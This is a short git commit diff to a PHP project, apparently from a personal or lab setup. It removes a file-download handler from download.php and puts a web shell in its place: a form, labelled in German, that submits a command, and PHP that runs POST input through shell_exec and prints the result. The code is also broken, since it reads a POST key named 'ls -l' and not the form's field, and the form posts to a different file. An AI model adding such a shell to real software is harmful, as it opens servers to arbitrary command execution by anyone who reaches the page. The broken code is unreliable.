191c923e60a344e4ec0be95b295a53e27de2cbc3
root <root@websql.mshome.net>
2023-12-08 13:58:04 +0000

    download.php

--- PHP/download.php
+++ PHP/download.php
@@ -1,20 +1,14 @@
+<form action="Shell.php" method="post">
+Datei? <input type="text" name="command">
+<input type="submit">
+</form>
 
 <?php
+$command = $_POST["ls -l"];
 
-$file = "test.txt";
 
-// Check if the file exists
-if (file_exists($file)) {
-    // Set appropriate headers
-    header('Content-Type: application/octet-stream');
-    header('Content-Disposition: attachment; filename=' . basename($file));
-    header('Content-Length: ' . filesize($file));
+echo "<pre>";
+echo shell_exec($command);
+echo "</pre>";
 
-    // Read the file and output it to the browser
-    readfile($file);
-    exit;
-} else {
-    // File not found
-    echo 'File not found.';
-}
 ?>
